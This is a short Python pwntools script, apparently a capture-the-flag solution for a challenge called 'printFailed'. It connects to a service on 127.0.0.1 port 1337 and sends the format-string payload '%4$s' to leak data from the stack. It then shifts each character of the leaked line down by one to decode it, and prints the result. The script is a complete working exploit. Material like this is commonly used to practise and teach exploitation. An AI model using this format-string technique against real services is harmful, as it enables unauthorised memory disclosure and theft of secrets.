from pwn import *
#must be run in bin to work
#p = process('./printFailed')
p = remote('127.0.0.1', 1337)
p.recvline()
p.sendline("%4$s")
p.recvline()
x = p.recvline()
y = ''
for i in x:
        y+=chr(ord(i)-1)
print(y)
